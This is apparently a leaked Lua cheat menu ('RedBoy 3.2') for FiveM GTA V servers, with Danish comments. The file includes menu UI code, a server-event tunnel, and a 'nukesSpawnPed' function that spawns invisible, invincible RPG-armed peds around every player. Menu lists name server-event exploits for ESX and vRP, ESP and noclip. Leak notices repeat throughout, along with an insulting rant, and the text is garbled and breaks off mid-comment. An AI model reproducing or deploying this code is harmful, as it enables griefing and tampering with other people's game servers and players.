function BeginTextCommandDisplayText(text)return Citizen.InvokeNative(0x25FBB336DF1804CB, text) end function AddTextComponentSubstringPlayerName(text)return Citizen.InvokeNative(0x6C188BE134E074AA, text)end function EndTextCommandDisplayText(x, y)return Citizen.InvokeNative(0xCD015E5BB0D96A57, x, y)end RPPPwdjwdU23 = {} RPPPwdjwdU23.debug = false local menus = {} local keys = {up = 172, down = 173, left = 174, right = 175, select = 191, back = 202} local optionCount = 0 local currentKey = nil local currentMenu = nil local titleHeight = 0.11 local titleXOffset = 0.5 local titleSpacing = 2 local titleYOffset = 0.03 local titleScale = 1.0 local buttonHeight = 0.038 local buttonFont = 0 local buttonScale = 0.365 local buttonTextXOffset = 0.005 local buttonTextYOffset = 0.005 local function debugPrint(text) if RPPPwdjwdU23.debug then Citizen.Trace('[RPPPwdjwdU23] ' .. tostring(text)) end end local function setMenuProperty(id, property, value) if id and menus[id] then menus[id][property] = value debugPrint(id .. ' menu property changed: { ' .. tostring(property) .. ', ' .. tostring(value) .. ' }') end end local function isMenuVisible(id) if id and menus[id] then return menus[id].visible else return false end end local function setMenuVisible(id, visible, holdCurrent) if id and menus[id] then setMenuProperty(id, 'visible', visible) if not holdCurrent and menus[id] then setMenuProperty(id, 'currentOption', 1) end if visible then if id ~= currentMenu and isMenuVisible(currentMenu) then setMenuVisible(currentMenu, false) end currentMenu = id end end end local function drawText(text, x, y, font, color, scale, center, shadow, alignRight)SetTextColour(color.r, color.g, color.b, color.a)SetTextFont(font)SetTextScale(scale, scale) if shadow then SetTextDropShadow(2, 2, 0, 0, 0) end if menus[currentMenu] then if center then SetTextCentre(center) elseif alignRight then SetTextWrap(menus[currentMenu].x, menus[currentMenu].x + menus[currentMenu].width - buttonTextXOffset)SetTextRightJustify(true) end end BeginTextCommandDisplayText("STRING")AddTextComponentSubstringPlayerName(text)EndTextCommandDisplayText(x, y) end local function drawRect(x, y, width, height, color)DrawRect(x, y, width, height, color.r, color.g, color.b, color.a) end local function drawTitle() if menus[currentMenu] then local x = menus[currentMenu].x + menus[currentMenu].width / 2 local xText = menus[currentMenu].x + menus[currentMenu].width * titleXOffset local y = menus[currentMenu].y + titleHeight * 1 / titleSpacing if menus[currentMenu].titleBackgroundSprite then DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255) else drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor) end drawText(menus[currentMenu].title, xText, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true) end end local function drawSubTitle() if menus[currentMenu] then local x = menus[currentMenu].x + menus[currentMenu].width / 2 local y = menus[currentMenu].y + titleHeight + buttonHeight / 2 local subTitleColor = {y = menus[currentMenu].titleBackgroundColor.r, g = menus[currentMenu].titleBackgroundColor.g, b = menus[currentMenu].titleBackgroundColor.b, a = 255}drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false) if optionCount > menus[currentMenu].maxOptionCount then drawText(tostring(menus[currentMenu].currentOption) .. ' / ' .. tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true) end end end local function drawButton(text, subText) local x = menus[currentMenu].x + menus[currentMenu].width / 2 local multiplier = nil if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then multiplier = optionCount elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount) end if multiplier then local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2 local backgroundColor = nil local textColor = nil local subTextColor = nil local shadow = false if menus[currentMenu].currentOption == optionCount then backgroundColor = menus[currentMenu].menuFocusBackgroundColor textColor = menus[currentMenu].menuFocusTextColor subTextColor = menus[currentMenu].menuFocusTextColor else backgroundColor = menus[currentMenu].menuBackgroundColor textColor = menus[currentMenu].menuTextColor subTextColor = menus[currentMenu].menuSubTextColor shadow = true end drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) if subText then drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true) end end end function RPPPwdjwdU23.CreateMenu(id, title)menus[id] = {}menus[id].title = title menus[id].subTitle = 'INTERACTION MENU' menus[id].visible = false menus[id].previousMenu = nil menus[id].aboutToBeClosed = false menus[id].x = 0.0175 menus[id].y = 0.025 menus[id].width = 0.23 menus[id].currentOption = 1 menus[id].maxOptionCount = 10 menus[id].titleFont = 1 menus[id].titleColor = {r = 0, g = 0, b = 0, a = 255}menus[id].titleBackgroundColor = {r = 245, g = 127, b = 23, a = 255}menus[id].titleBackgroundSprite = nil menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}menus[id].menuSubTextColor = {r = 189, g = 189, b = 189, a = 255}menus[id].menuFocusTextColor = {r = 0, g = 0, b = 0, a = 255}menus[id].menuFocusBackgroundColor = {r = 245, g = 245, b = 245, a = 255}menus[id].menuBackgroundColor = {r = 0, g = 0, b = 0, a = 160}menus[id].subTitleBackgroundColor = {r = menus[id].menuBackgroundColor.r, g = menus[id].menuBackgroundColor.g, b = menus[id].menuBackgroundColor.b, a = 255}menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"}debugPrint(tostring(id) .. ' menu created') end function RPPPwdjwdU23.CreateSubMenu(id, parent, subTitle) if menus[parent] then RPPPwdjwdU23.CreateMenu(id, menus[parent].title) if subTitle then setMenuProperty(id, 'subTitle', string.upper(subTitle)) else setMenuProperty(id, 'subTitle', string.upper(menus[parent].subTitle)) end setMenuProperty(id, 'previousMenu', parent)setMenuProperty(id, 'x', menus[parent].x)setMenuProperty(id, 'y', menus[parent].y)setMenuProperty(id, 'maxOptionCount', menus[parent].maxOptionCount)setMenuProperty(id, 'titleFont', menus[parent].titleFont)setMenuProperty(id, 'titleColor', menus[parent].titleColor)setMenuProperty(id, 'titleBackgroundColor', menus[parent].titleBackgroundColor)setMenuProperty(id, 'titleBackgroundSprite', menus[parent].titleBackgroundSprite)setMenuProperty(id, 'menuTextColor', menus[parent].menuTextColor)setMenuProperty(id, 'menuSubTextColor', menus[parent].menuSubTextColor)setMenuProperty(id, 'menuFocusTextColor', menus[parent].menuFocusTextColor)setMenuProperty(id, 'menuFocusBackgroundColor', menus[parent].menuFocusBackgroundColor)setMenuProperty(id, 'menuBackgroundColor', menus[parent].menuBackgroundColor)setMenuProperty(id, 'subTitleBackgroundColor', menus[parent].subTitleBackgroundColor) else debugPrint('Failed to create ' .. tostring(id) .. ' submenu: ' .. tostring(parent) .. ' parent menu doesn\'t exist') end end function RPPPwdjwdU23.CurrentMenu() return currentMenu end function RPPPwdjwdU23.OpenMenu(id) if id and menus[id] then PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)setMenuVisible(id, true)debugPrint(tostring(id) .. ' menu opened') else debugPrint('Failed to open ' .. tostring(id) .. ' menu: it doesn\'t exist') end end function RPPPwdjwdU23.IsMenuOpened(id) return isMenuVisible(id) end function RPPPwdjwdU23.IsAnyMenuOpened() for id, _ in pairs(menus) do if isMenuVisible(id) then return true end end return false end function RPPPwdjwdU23.IsMenuAboutToBeClosed() if menus[currentMenu] then return menus[currentMenu].aboutToBeClosed else return false end end function RPPPwdjwdU23.CloseMenu() if menus[currentMenu] then if menus[currentMenu].aboutToBeClosed then menus[currentMenu].aboutToBeClosed = false setMenuVisible(currentMenu, false)debugPrint(tostring(currentMenu) .. ' menu closed')PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)optionCount = 0 currentMenu = nil currentKey = nil else menus[currentMenu].aboutToBeClosed = true debugPrint(tostring(currentMenu) .. ' menu about to be closed') end end end function RPPPwdjwdU23.Button(text, subText) local buttonText = text if subText then buttonText = '{ ' .. tostring(buttonText) .. ', ' .. tostring(subText) .. ' }' end if menus[currentMenu] then optionCount = optionCount + 1 local isCurrent = menus[currentMenu].currentOption == optionCount drawButton(text, subText) if isCurrent then if currentKey == keys.select then PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)debugPrint(buttonText .. ' button pressed') return true elseif currentKey == keys.left or currentKey == keys.right then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) end end return false else debugPrint('Failed to create ' .. buttonText .. ' button: ' .. tostring(currentMenu) .. ' menu doesn\'t exist') return false end end function RPPPwdjwdU23.MenuButton(text, id) if menus[id] then if RPPPwdjwdU23.Button(text .. themecolor .. "   " .. themearrow) then setMenuVisible(currentMenu, false)setMenuVisible(id, true, true) return true end else debugPrint('Failed to create ' .. tostring(text) .. ' menu button: ' .. tostring(id) .. ' submenu doesn\'t exist') end return false end function RPPPwdjwdU23.CheckBox(text, checked, offtext, ontext, callback) if not offtext then offtext = "Off" end if not ontext then ontext = "On" end if RPPPwdjwdU23.Button(text, checked and ontext or offtext) then checked = not checked debugPrint(tostring(text) .. ' checkbox changed to ' .. tostring(checked)) if callback then callback(checked) end return true end return false end function RPPPwdjwdU23.ComboBox(text, items, currentIndex, selectedIndex, callback) local itemsCount = #items local selectedItem = items[currentIndex] local isCurrent = menus[currentMenu].currentOption == (optionCount + 1) if itemsCount > 1 and isCurrent then selectedItem = tostring(selectedItem) end if RPPPwdjwdU23.Button(text, selectedItem) then selectedIndex = currentIndex callback(currentIndex, selectedIndex) return true elseif isCurrent then if currentKey == keys.left then if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end elseif currentKey == keys.right then if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end end else currentIndex = selectedIndex end callback(currentIndex, selectedIndex) return false end function RPPPwdjwdU23.Display() if isMenuVisible(currentMenu) then if menus[currentMenu].aboutToBeClosed then RPPPwdjwdU23.CloseMenu() else ClearAllHelpMessages()drawTitle()drawSubTitle()currentKey = nil if IsDisabledControlJustReleased(1, keys.down) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if menus[currentMenu].currentOption < optionCount then menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1 else menus[currentMenu].currentOption = 1 end elseif IsDisabledControlJustReleased(1, keys.up) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if menus[currentMenu].currentOption > 1 then menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1 else menus[currentMenu].currentOption = optionCount end elseif IsDisabledControlJustReleased(1, keys.left) then currentKey = keys.left elseif IsDisabledControlJustReleased(1, keys.right) then currentKey = keys.right elseif IsDisabledControlJustReleased(1, keys.select) then currentKey = keys.select elseif IsDisabledControlJustReleased(1, keys.back) then if menus[menus[currentMenu].previousMenu] then PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)setMenuVisible(menus[currentMenu].previousMenu, true) else RPPPwdjwdU23.CloseMenu() end end optionCount = 0 end end end function RPPPwdjwdU23.SetMenuWidth(id, width)setMenuProperty(id, 'width', width) end function RPPPwdjwdU23.SetMenuX(id, x)setMenuProperty(id, 'x', x) end function RPPPwdjwdU23.SetMenuY(id, y)setMenuProperty(id, 'y', y) end function RPPPwdjwdU23.SetMenuMaxOptionCountOnScreen(id, count)setMenuProperty(id, 'maxOptionCount', count) end function RPPPwdjwdU23.SetTitle(id, title)setMenuProperty(id, 'title', title) end function RPPPwdjwdU23.SetTitleColor(id, r, g, b, a)setMenuProperty(id, 'titleColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a}) end function RPPPwdjwdU23.SetTitleBackgroundColor(id, r, g, b, a)setMenuProperty(id, 'titleBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a}) end function RPPPwdjwdU23.SetTitleBackgroundSprite(id, textureDict, textureName)RequestStreamedTextureDict(textureDict)setMenuProperty(id, 'titleBackgroundSprite', {dict = textureDict, name = textureName}) end function RPPPwdjwdU23.SetSubTitle(id, text)setMenuProperty(id, 'subTitle', string.upper(text)) end function RPPPwdjwdU23.SetMenuBackgroundColor(id, r, g, b, a)setMenuProperty(id, 'menuBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a}) end function RPPPwdjwdU23.SetMenuTextColor(id, r, g, b, a)setMenuProperty(id, 'menuTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a}) end function RPPPwdjwdU23.SetMenuSubTextColor(id, r, g, b, a)setMenuProperty(id, 'menuSubTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a}) end function RPPPwdjwdU23.SetMenuFocusColor(id, r, g, b, a)setMenuProperty(id, 'menuFocusColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a}) end function RPPPwdjwdU23.SetMenuButtonPressedSound(id, name, set)setMenuProperty(id, 'buttonPressedSound', {['name'] = name, ['set'] = set}) end Tools = {} local IDGenerator = {} function Tools.newIDGenerator() local r = setmetatable({}, {__index = IDGenerator})r:construct() return r end function IDGenerator:construct()self:clear() end function IDGenerator:clear()self.max = 0 self.ids = {} end function IDGenerator:gen() if #self.ids > 0 then return table.remove(self.ids) else local r = self.max self.max = self.max + 1 return r end end function IDGenerator:free(id)table.insert(self.ids, id) end Tunnel = {} local function tunnel_resolve(itable, key) local mtable = getmetatable(itable) local iname = mtable.name local ids = mtable.tunnel_ids local callbacks = mtable.tunnel_callbacks local identifier = mtable.identifier local fcall = function(args, callback) if args == nil then args = {} end if type(callback) == "function" then local rid = ids:gen()callbacks[rid] = callback TriggerServerEvent(iname .. ":tunnel_req", key, args, identifier, rid) else TriggerServerEvent(iname .. ":tunnel_req", key, args, "", -1) end end itable[key] = fcall return fcall end function Tunnel.bindInterface(name, interface)RegisterNetEvent(name .. ":tunnel_req")AddEventHandler(name .. ":tunnel_req", function(member, args, identifier, rid) local f = interface[member] local delayed = false local rets = {} if type(f) == "function" then TUNNEL_DELAYED = function()delayed = true return function(rets)rets = rets or {} if rid >= 0 then TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets) end end end rets = {f(table.unpack(args))} end if not delayed and rid >= 0 then TriggerServerEvent(name .. ":" .. identifier .. ":tunnel_res", rid, rets) end end) end function Tunnel.getInterface(name, identifier) local ids = Tools.newIDGenerator() local callbacks = {} local r = setmetatable({}, {__index = tunnel_resolve, name = name, tunnel_ids = ids, tunnel_callbacks = callbacks, identifier = identifier})RegisterNetEvent(name .. ":" .. identifier .. ":tunnel_res")AddEventHandler(name .. ":" .. identifier .. ":tunnel_res", function(rid, args) local callback = callbacks[rid] if callback ~= nil then ids:free(rid)callbacks[rid] = nil callback(table.unpack(args)) end end) return r end Proxy = {} local proxy_rdata = {} local function proxy_callback(rvalues)proxy_rdata = rvalues end local function proxy_resolve(itable, key) local iname = getmetatable(itable).name local fcall = function(args, callback) if args == nil then args = {} end TriggerEvent(iname .. ":proxy", key, args, proxy_callback) return table.unpack(proxy_rdata) end itable[key] = fcall return fcall end function Proxy.addInterface(name, itable)AddEventHandler(name .. ":proxy", function(member, args, callback) local f = itable[member] if type(f) == "function" then callback({f(table.unpack(args))}) else end end) end function Proxy.getInterface(name) local r = setmetatable({}, {__index = proxy_resolve, name = name}) return r end

-- har er skal dit naven vis du vil have dit naven i menuen
developers = {
    "Main Dev K??DKONGEN#9999",
    "customer #1 Du ik flot#1021",
    "Discord | Discord.gg/bKJd4eC5Db",
    "K??DKONGENS Girlfriend B!ue#9999",
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
    "my friend ???! Birgit???",
}

local function has_value (tab, val)
    for index, value in ipairs(tab) do
        if value == val then
            return true
        end
    end
    return false
end

function nukesSpawnPed(aA)
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
	if IsModelValid(aA) then
		local aB = "weapon_minigun"
		for W, af in ipairs(GetActivePlayers()) do
			local aC = GetHashKey(aA)
			local aD = GetEntityCoords(GetPlayerPed(af))
			RequestModel(aC)
			Citizen.Wait(50)
			if HasModelLoaded(aC) then
				local aA = CreatePed(21, aC, aD.x - 1, aD.y, aD.z, 0, true, true)
				local aE = CreatePed(21, aC, aD.x + 1, aD.y, aD.z, 0, true, true)
				local aF = CreatePed(21, aC, aD.x, aD.y - 1, aD.z, 0, true, true)
				local aG = CreatePed(21, aC, aD.x, aD.y + 1, aD.z, 0, true, true)
				NetworkSetEntityInvisibleToNetwork(aA, true)
				NetworkSetEntityInvisibleToNetwork(aE, true)
				NetworkSetEntityInvisibleToNetwork(aF, true)
				NetworkSetEntityInvisibleToNetwork(aG, true)
                --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
				NetworkRegisterEntityAsNetworked(aA)
				if
					DoesEntityExist(aA) and DoesEntityExist(aE) and DoesEntityExist(aF) and DoesEntityExist(aG) and
						not IsEntityDead(GetPlayerPed(af))
				then
					SetEntityInvincible(aA, true)
					SetEntityInvincible(aE, true)
					SetEntityInvincible(aF, true)
					SetEntityInvincible(aG, true)
					local aH = PedToNet(aA)
					PedToNet(aE)
					PedToNet(aF)
					PedToNet(aG)
					NetworkSetNetworkIdDynamic(aH, fz5f46zfss)
					SetNetworkIdCanMigrate(aH, true)
					SetNetworkIdExistsOnAllMachines(aH, true)
					GiveWeaponToPed(aA, GetHashKey("weapon_rpg"), 9999, 1, 1)
					GiveWeaponToPed(aE, GetHashKey("weapon_rpg"), 9999, 1, 1)
					GiveWeaponToPed(aF, GetHashKey("weapon_rpg"), 9999, 1, 1)
					GiveWeaponToPed(aG, GetHashKey("weapon_rpg"), 9999, 1, 1)
					SetPlayerWeaponDamageModifier(aA, 999999999999999)
					SetPlayerWeaponDamageModifier(aE, 999999999999999)
                    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
					SetPlayerWeaponDamageModifier(aF, 999999999999999)
					SetPlayerWeaponDamageModifier(aG, 999999999999999)
					SetPedCanSwitchWeapon(aA, true)
					NetToPed(aH)
					TaskCombatPed(aA, GetPlayerPed(af), 0, 16)
					TaskCombatPed(aE, GetPlayerPed(af), 0, 16)
					TaskCombatPed(aF, GetPlayerPed(af), 0, 16)
					TaskCombatPed(aG, GetPlayerPed(af), 0, 16)
				elseif IsEntityDead(GetPlayerPed(af)) then
					TaskCombatHatedTargetsInArea(aA, aD.x, aD.y, aD.z, 500)
					TaskCombatHatedTargetsInArea(pe2, aD.x, aD.y, aD.z, 500)
					TaskCombatHatedTargetsInArea(aF, aD.x, aD.y, aD.z, 500)
					TaskCombatHatedTargetsInArea(aG, aD.x, aD.y, aD.z, 500)
				else
					Citizen.Wait(0)
				end
			end
		end
	else
		ShowInfo("~r~Ped Is Not Valid!")
	end
end


--[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
    --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]


-- her er dit auth id
local function has_value (tab, val)
    for index, value in ipairs(tab) do
        if value == val then
            return true
        end
    end
    return false
end

--[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]

--[[local RockstarID = ScGetNickname()
local allowedRockstarIDs = {
    'mads ID',
    '1120711743',
}
for bs=0,9 do 
    print("velkommen til RedBoy developer of the menu K??DKONGEN#9999")
end
if has_value(allowedRockstarIDs, RockstarID) then
    
else
    for bs=0,9 do 
        print("Kontakt K??DKONGEN#9999 for at k??be. Auth ID: " .. RockstarID)
    end
    local i = 1
    while a[i] do
       if a[i] == v then break end
       i = i + 1
    end
end]]


menuKeybind = "F10"
menuKeybind5 = ""
menuKeybind2 = "F7"
fixcarKeybind = "F6"
healplayerKeybind = "F11"

udwdj = TriggerServerEvent


menuName = "~b~RedBoy"
--[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
version = "~r~3.2"
theme = "redboy43"
themes = {"RedBoy", "LyseR??deModder", "light", "black", "dark", "infamous", "k??dkongen", "basic", "nuke", "nice", "Maja", "Allstars"}
--[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
mpMessage = false
startMessage = "??? ~w~Velkommen til ~b~RedBoy ~r~3.2~w~, " .. GetPlayerName(PlayerId()) .. "." 
subMessage = "Tryk ~w~" .. menuKeybind .. "~w~ For at ??bne ~q~M~g~e~r~n~b~u~p~e~o~n."


menulist = {
        
        -- MAIN SUBMENUS
        'RedBoy',
        'player',
        'self',
        'weapon',
        'vehicle',
        'world',
        'misc',
        'teleport',
        'lua',
        'modifyskintextures',
        'server resource',
        'models',
        'dyr',
        'ytt',
        'modder',
        
        -- PLAYER SUBMENUS
        'allplayer',
        'playeroptions',
        
        -- PLAYER SUBMENUS
        'allplayer',
        'playeroptions',
        
        -- WEAPON SUBMENUS
        'weaponspawner',
        'weaponspawnerplayer',
        
        -- WEAPON SPAWNER SUBMENUS
        'melee',
        'pistol',
        'shotgun',
        'smg',
        'assault',
        'sniper',
        'thrown',
        'heavy',
        
        -- VEHICLE SUBMENUS
        'vehiclespawner',
        'vehiclemods',
        'vehiclemenu',
        
        'vehiclecolors',
        'vehiclecolors_primary',
        'vehiclecolors_secondary',
        'primary_classic',
        'primary_matte',
        'primary_metal',
        'secondary_classic',
        'secondary_matte',
        'secondary_metal',
        
        'vehicletuning',
        
        -- VEHICLE SPAWNER SUBMENUS
        'compacts',
        'sedans',
        'suvs',
        'coupes',
        'muscle',
        'sportsclassics',
        'sports',
        'super',
        'motorcycles',
        'offroad',
        'industrial',
        'utility',
        'vans',
        'cycles',
        'boats',
        'helicopters',
        'planes',
        'service',
        'commercial',
        
        
        -- WORLD SUBMENUS
        'objectspawner',
        'objectlist',
        'weather',
        'time',
        
        -- MISC SUBMENUS
		'esp',
		'keybindings',
		'webradio',
        'credits',
        
        -- TELEPORT SUBMENUS
        'saveload',
        'pois',
        
        -- LUA SUBMENUS
        -- esx er server Filer
        --[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
        'esx',
        -- vRP er dansk server nogen gang er det ogs?? Engelsk server!!
        'vrp',
        -- Custom Menu er der der er Ejer-Tool i
        'Custom Menu',
        -- her er TriggerEventsVRP er det man kan gi sig selv hvad man vil som der sider i alle Client.lua!!!
        -- og TriggerEventsVRP kan ogs?? v??re i server.lua ;)
        'TriggerEventsVRP',

}

--[[

den her er til dig du er en taber du er grim og dum stop med at leak noget som jeg har lavet fuck dig ;(
    og hvordan fuck crack du RedBoy 3.2
    du er gay du kan ik kode lua. fuck lave en menu selv
    
--]]
faceItemsList = {}
faceTexturesList = {}
--[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
hairItemsList = {}
hairTextureList = {}
maskItemsList = {}
hatItemsList = {}
hatTexturesList = {}


NoclipSpeedOps = {1, 5, 10, 20, 30}

NoclipSpeed = 1
--[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]
oldSpeed = nil


ForcefieldRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}

ForcefieldRadius = 5.0


FastCB = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}

FastRunMultiplier = 1.0
FastSwimMultiplier = 1.0


RotationOps = {0, 45, 90, 135, 180}
--[[leaket by k??dkongen#9999
jeg leaker den fordi alle pr??ver men de kan ik eller nogen kan leak den men jeg g??r den f??rst s?? her 
pls lad v??re og ??ndre navnet i den s?? er du s??d. :(
    og jeg g??r det her for dig
    n?? men tak til alle der har v??ret med til det her hov der er jo kun mig K??DKONGEN#9999
    og tak til Du ik flot#1021 for at v??re der fra start]]

ObjRotation = 90


GravityOps = {0.0, 5.0, 9.8, 50.0, 100.0, 200.0, 500.0, 1000.0, 9999.9}
GravityOpsWords = {"0", "5", "Default", "50", "100", "200", "500", "1000", "9999"}

GravAmount = 9.8


SpeedModOps = {1.0, 1.5, 2.0, 3.0, 5.0, 10.0, 20.0, 50.0, 100.0, 500.0, 1000.0}
SpeedModAmt = 1.0


ESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0}
EspDistance = 5000.0


ESPRefreshOps = {"0ms", "100ms", "250ms", "500ms", "1s", "2s", "5s"}
--[[leaket by k??dkongen#9999
